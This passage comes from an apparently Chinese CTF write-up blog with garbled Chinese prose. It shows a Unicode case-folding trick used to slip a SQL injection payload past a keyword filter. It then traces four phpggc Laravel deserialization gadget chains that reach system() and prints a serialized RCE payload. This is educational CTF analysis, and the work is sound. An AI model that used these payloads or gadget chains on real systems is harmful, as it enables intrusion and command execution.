class="line"><span class="string">'writable'</span>: <span class="literal">true</span></span><br><span class="line">&#125;);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">String</span>.fromCodePoint = fromCodePoint;</span><br><span class="line">&#125;</span><br><span class="line">&#125;());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="string">'A'</span>.charCodeAt(); j &lt;= <span class="string">'Z'</span>.charCodeAt(); j++)&#123;</span><br><span class="line"><span class="keyword">var</span> s = <span class="built_in">String</span>.fromCodePoint(j);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10FFFF</span>; i++) &#123;</span><br><span class="line"><span class="keyword">var</span> e = <span class="built_in">String</span>.fromCodePoint(i);</span><br><span class="line"><span class="keyword">if</span> (s == e.toUpperCase() &amp;&amp; s != e) &#123;</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">"char: "</span>+e+<span class="string">"&lt;br/&gt;"</span>);</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>æœ€ç»ˆå¯ä»¥å¾—å‡ºä»¥ä¸‹å‡ ç‚¹ç‰¹æ€§<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;Ä±&quot;.toUpperCase() == &apos;I&apos;</span><br><span class="line">&quot;Å¿&quot;.toUpperCase() == &apos;S&apos;</span><br><span class="line">&quot;â„ª&quot;.toLowerCase() == &apos;k&apos;</span><br></pre></td></tr></table></figure></p><p>ä»è€Œæ„é€ payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=test&amp;password=%27+un%C4%B1on+%C5%BFelect+1,(%C5%BFelect+flag+from+flags),&apos;3</span><br></pre></td></tr></table></figure></p><p>æˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹è¿™ä¸ªpayloadç»è¿‡å¤„ç†ä¹‹åæ˜¯æ€æ ·çš„<br><img src="https://i.loli.net/2020/06/04/rTmCKdtoAf8GyhU.png" alt="5D317E21-AE8E-4A5E-A15A-80D1391CFE11.png"></p><p>PS: è¡¥å……å¦å¤–ä¸€ä¸ªJSçš„å°ç‰¹æ€§ï¼Œè¿™ä¸ªç‰¹æ€§åœ¨<a href="https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/" target="_blank" rel="noopener">ã€ŠSecurity Bugs in Practice: SSRF via Request Splittingã€‹</a>ä¸­è¢«ä½¿ç”¨</p><p><img src="https://i.loli.net/2020/06/04/U9mFsQtNZe8nSpu.png" alt="340A0E5E-C178-423A-ACF1-6C8100E5E7E1.png"></p><h3 id="2-unicodeå¤§å°å†™è½¬æ¢é—®é¢˜"><a href="#2-unicodeå¤§å°å†™è½¬æ¢é—®é¢˜" class="headerlink" title="2.unicodeå¤§å°å†™è½¬æ¢é—®é¢˜"></a>2.unicodeå¤§å°å†™è½¬æ¢é—®é¢˜</h3><p>åœ¨æ­¤å¤„è¡¥å……ä¸€ä¸‹Python3çš„unicodeå¤§å°å†™è½¬æ¢é—®é¢˜ï¼Œé€ æˆè¿™ä¸ªé—®é¢˜çš„åŸå› æ˜¯</p><blockquote><p>è¿™é‡Œçš„ç‰¹æ®Šéƒ¨åˆ†æ˜¯è½¬æ¢è¡Œä¸ºã€‚ å¹¶éæ‰€æœ‰Unicodeå­—ç¬¦åœ¨è½¬æ¢ä¸ºå¤§å†™å­—æ¯æ—¶éƒ½å…·æœ‰åŒ¹é…çš„è¡¨ç¤ºå½¢å¼ - å› æ­¤æµè§ˆå™¨é€šå¸¸å€¾å‘äºé‡‡ç”¨å¤–è§‚ç›¸ä¼¼ï¼Œæœ€é€‚åˆçš„æ˜ å°„ASCIIå­—ç¬¦ã€‚ è¿™ç§è¡Œä¸ºæœ‰ç›¸å½“å¤§èŒƒå›´çš„å­—ç¬¦ï¼Œæ‰€æœ‰æµè§ˆå™¨çš„åšæ³•éƒ½æœ‰æ‰€ä¸åŒã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;Ä±&quot;.upper() == &apos;I&apos;</span><br><span class="line">&quot;Å¿&quot;.upper() == &apos;S&apos;</span><br><span class="line">&quot;â„ª&quot;.lower() == &apos;k&apos;</span><br></pre></td></tr></table></figure></p></blockquote><p>è¿˜æœ‰ä¸€äº›å…¶å…¶å®ƒçš„ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">â„ª ---- k</span><br><span class="line">ÃŸ(223) ---- SS</span><br><span class="line">Ä±(305) ---- I</span><br><span class="line">Å¿(383) ---- S</span><br><span class="line">ï¬€(64256) ---- FF</span><br><span class="line">ï¬(64257) ---- FI</span><br><span class="line">ï¬‚(64258) ---- FL</span><br><span class="line">ï¬ƒ(64259) ---- FFI</span><br><span class="line">ï¬„(64260) ---- FFL</span><br><span class="line">ï¬…(64261) ---- ST</span><br><span class="line">ï¬†(64262) ---- ST</span><br></pre></td></tr></table></figure></p><h2 id="0x06-lumenserial"><a href="#0x06-lumenserial" class="headerlink" title="0x06 lumenserial"></a>0x06 lumenserial</h2><h3 id="1-ç¯å¢ƒé…ç½®"><a href="#1-ç¯å¢ƒé…ç½®" class="headerlink" title="1. ç¯å¢ƒé…ç½®"></a>1. ç¯å¢ƒé…ç½®</h3><p>å› ä¸ºæ­¤é¢˜æ˜¯åŸºäºlaravelæ¡†æ¶å¼€å‘çš„ï¼Œæ‰€ä»¥åœ¨æœ¬åœ°è¦ç”¨ <code>composer install</code> è¿›è¡Œç¯å¢ƒé…ç½®ï¼Œæ–¹ä¾¿åé¢çš„å®¡è®¡ã€‚</p><h3 id="2-phpggc"><a href="#2-phpggc" class="headerlink" title="2. phpggc"></a>2. phpggc</h3><p>è¿™ä¸ªé¢˜ç›®æ˜¯åŸºäºlaravelæ¡†æ¶å¼€å‘çš„ï¼Œphpggcä¸­åˆæ°å¥½æœ‰4ç§å…³äºLaravelæ¡†æ¶RCEçš„payloadç”Ÿæˆæ–¹æ³•ï¼Œæ‰€ä»¥é¦–å…ˆå­¦ä¹ ä¸€ä¸‹è¿™å››ç§payloadçš„ç”Ÿæˆã€‚</p><h4 id="ç¬¬ä¸€ç§"><a href="#ç¬¬ä¸€ç§" class="headerlink" title="ç¬¬ä¸€ç§"></a>ç¬¬ä¸€ç§</h4><p><img src="https://i.loli.net/2020/06/04/vxsyGtKFm4WMlon.png" alt="1EE2E9E0-5236-4E90-983E-AA8AA94371D0.png"></p><p>ä»ä¸Šå›¾ä»£ç æˆ‘ä»¬å¯ä»¥åˆ†æå‡ºååºåˆ—åŒ–çš„æ—¶å€™ï¼Œç±»æ–¹æ³•è°ƒç”¨è¿‡ç¨‹å¦‚ä¸‹ï¼Œé¦–å…ˆæ‰§è¡Œå¦‚ä¸‹è¯­å¥ï¼Œå‡è®¾æ­¤æ—¶<code>$function</code>å’Œ<code>$parameter</code>å‚æ•°åˆ†åˆ«å¯¹åº”<code>system</code>å’Œ<code>id</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> \Illuminate\Broadcasting\PendingBroadcast(<span class="keyword">new</span> \Faker\Generator($function),$parameter);</span><br></pre></td></tr></table></figure></p><p>æ¥ç€è·Ÿè¿›åˆ°<code>\Illuminate\Broadcasting\PendingBroadcast</code>ç±»ä¸­çœ‹åˆ°å¦‚ä¸‹ä¿¡æ¯<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;events-&gt;dispatch(<span class="keyword">$this</span>-&gt;event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>å°†ä¹‹å‰çš„<code>(new \Faker\Generator($function),$parameter)</code>ä»£å…¥å…¶å®æ‰§è¡Œçš„å°±æ˜¯<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> \Faker\Generator($function)-&gt;dispatch($parameter);</span><br></pre></td></tr></table></figure></p><p>å¯çœ‹åˆ°å°†<code>Generator</code>å½“åšå‡½æ•°è°ƒç”¨è¿›è¡Œä½¿ç”¨äº†ï¼Œæ‰€ä»¥ç›´æ¥æŸ¥çœ‹åˆ°å…¶ä¸­çš„å¦‚ä¸‹ä»£ç ï¼Œæ­¤æ—¶<code>__call</code>çš„å‚æ•°æ˜¯dispatchå’Œid<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $attributes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;format($method, $attributes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ä¹‹åè·Ÿè¿›<code>format</code>å‡½æ•°è¿›è¡ŒæŸ¥çœ‹ï¼Œå‘ç°ä½¿ç”¨åˆ°äº†<code>call_user_func_array</code>å‡½æ•°æ¥è¿›è¡Œå¤„ç†ã€‚<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span><span class="params">($formatter, $arguments = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;getFormatter($formatter), $arguments);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ç»§ç»­è·Ÿè¿›ä¸€ä¸‹<code>getFormatter</code>å‡½æ•°ï¼Œå…¶ä¸­çš„å‚æ•°æ˜¯dispatch<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFormatter</span><span class="params">($formatter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;formatters[$formatter])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;formatters[$formatter];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;providers <span class="keyword">as</span> $provider) &#123;</span><br><span class="line">        <span class="keyword">if</span> (method_exists($provider, $formatter)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[$formatter] = <span class="keyword">array</span>($provider, $formatter);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;formatters[$formatter];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> \InvalidArgumentException(sprintf(<span class="string">'Unknown formatter "%s"'</span>, $formatter));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>æœ€ç»ˆ<code>getFormatter</code>å‡½æ•°å°†è¿”å›<code>system</code>ã€‚</p><p>PSï¼š<code>__call</code>æ˜¯åœ¨ä¸å­˜åœ¨å¯¹åº”çš„å‡½æ•°è°ƒç”¨æ—¶æ‰ä½¿ç”¨çš„ã€‚</p><h4 id="ç¬¬äºŒç§"><a href="#ç¬¬äºŒç§" class="headerlink" title="ç¬¬äºŒç§"></a>ç¬¬äºŒç§</h4><p><img src="https://i.loli.net/2020/06/04/nGRtrgNpxbYfZ8c.png" alt="34CC2E37-D469-460F-8940-A0F6F2ED3C48.png"></p><p>ç±»ä¼¼çš„è¿›è¡Œåˆ†æï¼Œé¦–å…ˆåœ¨ååºåˆ—åŒ–æ—¶ä¹Ÿæ˜¯å…ˆè¿›å…¥<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;events-&gt;dispatch(<span class="keyword">$this</span>-&gt;event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>é’ˆå¯¹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> \Illuminate\Broadcasting\PendingBroadcast(<span class="keyword">new</span> \Illuminate\Events\Dispatcher($function, $parameter),$parameter);</span><br></pre></td></tr></table></figure></p><p>å¯¹åº”æ‰§è¡Œçš„å°±æ˜¯<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">new</span> \Illuminate\Events\Dispatcher($function, $parameter)-&gt;dispatch($parameter)</span><br></pre></td></tr></table></figure></p><p>è¦çŸ¥é“æ­¤æ—¶æ˜¯æœ‰<code>dispatch</code>è¿™ä¸ªå‡½æ•°çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±ç»§ç»­è·Ÿè¿›è¿™ä¸ªå‡½æ•°<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatch</span><span class="params">($event, $payload = [], $halt = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    [$event, $payload] = <span class="keyword">$this</span>-&gt;parseEventAndPayload(</span><br><span class="line">        $event, $payload</span><br><span class="line">    );<span class="comment">//å°†$eventè®¾ç½®ä¸ºæ•°ç»„è¿”å›</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;shouldBroadcast($payload)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;broadcastEvent($payload[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $responses = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;getListeners($event) <span class="keyword">as</span> $listener) &#123;</span><br><span class="line">        $response = $listener($event, $payload);</span><br><span class="line">        <span class="keyword">if</span> ($halt &amp;&amp; ! is_null($response)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $response;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($response === <span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $responses[] = $response;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $halt ? <span class="keyword">null</span> : $responses;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>æ­¤å¤„åªçœ‹<code>$event</code>å˜é‡çš„ä¼ é€’ï¼Œæ‰€ä»¥ç»§ç»­è·Ÿå…¥<code>getListeners</code>å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¼ å…¥çš„ç±»åè‚¯å®šæ˜¯ä¸å­˜åœ¨çš„ï¼Œå› æ­¤è¿™ä¸ªå‡½æ•°å¿…å®šè¿”å›<code>$listeners</code>å˜é‡çš„å€¼ã€‚<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getListeners</span><span class="params">($eventName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $listeners = <span class="keyword">$this</span>-&gt;listeners[$eventName] ?? [];</span><br><span class="line"></span><br><span class="line">    $listeners = array_merge(</span><br><span class="line">        $listeners,</span><br><span class="line">        <span class="keyword">$this</span>-&gt;wildcardsCache[$eventName] ?? <span class="keyword">$this</span>-&gt;getWildcardListeners($eventName)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> class_exists($eventName, <span class="keyword">false</span>)</span><br><span class="line">                ? <span class="keyword">$this</span>-&gt;addInterfaceListeners($eventName, $listeners)</span><br><span class="line">                : $listeners;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>å‡è®¾æˆ‘ä»¬ä½¿ç”¨phpggcç”Ÿæˆçš„payloadå¦‚ä¸‹<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> zeroyu@zeros ~ ./phpggc Laravel/RCE2 system id</span><br><span class="line">O:40:<span class="string">"Illuminate\Broadcasting\PendingBroadcast"</span>:2:&#123;s:9:<span class="string">"*events"</span>;O:28:<span class="string">"Illuminate\Events\Dispatcher"</span>:1:&#123;s:12:<span class="string">"*listeners"</span>;a:1:&#123;s:2:<span class="string">"id"</span>;a:1:&#123;i:0;s:6:<span class="string">"system"</span>;&#125;&#125;&#125;s:8:<span class="string">"*event"</span>;s:2:<span class="string">"id"</span>;&#125;</span><br></pre></td></tr></table></figure></p><p>é‚£ä¹ˆæœ€ç»ˆdispatchå‡½æ•°ä¸­çš„<code>$response = $listener($event, $payload);</code>å¯¹åº”è¿”å›çš„å°±æ˜¯<code>$response=system(&#39;id&#39;,[]);</code>æ­¤æ—¶<code>$response</code>å°†ä¿å­˜æœ‰å‘½ä»¤æ‰§è¡Œåçš„ç»“æœã€‚</p><h4 id="ç¬¬ä¸‰ç§"><a href="#ç¬¬ä¸‰ç§" class="headerlink" title="ç¬¬ä¸‰ç§"></a>ç¬¬ä¸‰ç§</h4><p><img src="https://i.loli.net/2020/06/04/WtPgK6V9yrzF3cl.png" alt="3CC61DDE-DA5C-4278-B0C8-6FDEDBB79714.png"></p><p>ç”±ä¸‹é¢è¿™å¥ä»£ç å±•å¼€åˆ†æ<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> \Illuminate\Broadcasting\PendingBroadcast(<span class="keyword">new</span> \Illuminate\Notifications\ChannelManager($function, $parameter)</span><br></pre></td></tr></table></figure></p><p>ååºåˆ—åŒ–çš„æ—¶å€™é¦–å…ˆè¿˜æ˜¯åˆ°<code>PendingBroadcast</code>ä¸­è°ƒç”¨<code>__destruct</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;events-&gt;dispatch(<span class="keyword">$this</span>-&gt;event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>æ‰€è¿™æ¬¡çš„å°±ç›¸å½“äº<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> \Illuminate\Notifications\ChannelManager($function, $parameter)-&gt;dispatch(<span class="keyword">$this</span>-&gt;event);</span><br></pre></td></tr></table></figure></p><p>è¦çŸ¥é“<code>ChannelManager</code>é‡Œé¢æ˜¯æ²¡æœ‰<code>dispatch</code>å‡½æ•°çš„ï¼Œæ‰€ä»¥å°±ä¼šè°ƒç”¨<code>__call</code>å‡½æ•°<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $parameters)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;driver()-&gt;$method(...$parameters);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>$method(...$parameters);</code>è¿™éƒ¨åˆ†å¹¶ä¸é‡è¦ï¼Œä¹‹åä¸»è¦è·Ÿè¿›<code>driver</code>å‡½æ•°<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">driver</span><span class="params">($driver = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $driver = $driver ?: <span class="keyword">$this</span>-&gt;getDefaultDriver();</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;drivers[$driver])) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;drivers[$driver] = <span class="keyword">$this</span>-&gt;createDriver($driver);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;drivers[$driver];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ä¹‹å‰æˆ‘ä»¬è®¾ç½®äº†å¦‚ä¸‹å‡ ä¸ªå˜é‡ï¼Œæ‰€ä»¥åœ¨æ­¤å¤„<code>getDefaultDriver();</code>å°†è¿”å›<code>x</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;app = $parameter;</span><br><span class="line"><span class="keyword">$this</span>-&gt;customCreators = [<span class="string">'x'</span> =&gt; $function];</span><br><span class="line"><span class="keyword">$this</span>-&gt;defaultChannel = <span class="string">'x'</span>;</span><br></pre></td></tr></table></figure></p><p>æ¥ä¸‹æ¥ä¼šç»§ç»­åˆ°<code>createDriver</code>å‡½æ•°çš„ä½ç½®ï¼Œä¹‹åè·Ÿè¿›ä¸€ä¸‹è¿™ä¸ªå‡½æ•°<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">createDriver</span><span class="params">($driver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;customCreators[$driver])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;callCustomCreator($driver);</span><br></pre></td></tr></table></figure></p><p>å¯ä»¥çœ‹åˆ°æ¥ä¸‹æ¥ç»§ç»­è¿›å…¥<code>callCustomCreator</code>å‡½æ•°<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">callCustomCreator</span><span class="params">($driver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;customCreators[$driver](<span class="keyword">$this</span>-&gt;app);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ä¹Ÿæ­£æ˜¯åœ¨æ­¤å¤„è¿”å›äº†<code>$function($parameter)</code>çš„æ‰§è¡Œç»“æœã€‚</p><h4 id="ç¬¬å››ç§"><a href="#ç¬¬å››ç§" class="headerlink" title="ç¬¬å››ç§"></a>ç¬¬å››ç§</h4><p><img src="https://i.loli.net/2020/06/04/QmCRgJausZ3DBLj.png" alt="A8C1FFAB-D86C-4B3B-B50D-DC4296B52A29.png"></p><p>é¦–å…ˆçœ‹ä¸€ä¸‹è¿™ä¸ªchainçš„å¼€å§‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> \Illuminate\Broadcasting\PendingBroadcast(<span class="keyword">new</span> \Illuminate\Validation\Validator($function),$parameter);</span><br></pre></td></tr></table></figure></p><p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™é“¾ä¹Ÿæ˜¯ä»<code>PendingBroadcast</code>çš„<code>__destruct</code>å¼€å§‹çš„<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;events-&gt;dispatch(<span class="keyword">$this</span>-&gt;event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>æ‰€ä»¥æ­¤å¤„å¯¹åº”çš„æ‰§è¡Œå°±æ˜¯<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> \Illuminate\Validation\Validator($function)-&gt;dispatch($parameter);</span><br></pre></td></tr></table></figure></p><p>å¯ä»¥çœ‹åˆ°<code>Validator</code>ç±»ä¸­ä¹Ÿæ˜¯æ²¡æœ‰<code>dispatch</code>å‡½æ•°çš„ï¼Œå› æ­¤è°ƒç”¨çš„æ˜¯<code>__call</code>å‡½æ•°<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $parameters)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $rule = Str::snake(substr($method, <span class="number">8</span>));</span><br><span class="line">    <span class="comment">// $rule=''</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;extensions[$rule])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;callExtension($rule, $parameters);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> BadMethodCallException(<span class="string">"Method [$method] does not exist."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ä¹‹åè·Ÿè¿›<code>callExtension</code>å‡½æ•°ï¼Œåœ¨å…¶ä¸­çš„<code>call_user_func_array</code>å¤„æˆåŠŸæ‰§è¡Œæˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„å‡½æ•°ã€‚<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">callExtension</span><span class="params">($rule, $parameters)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $callback = <span 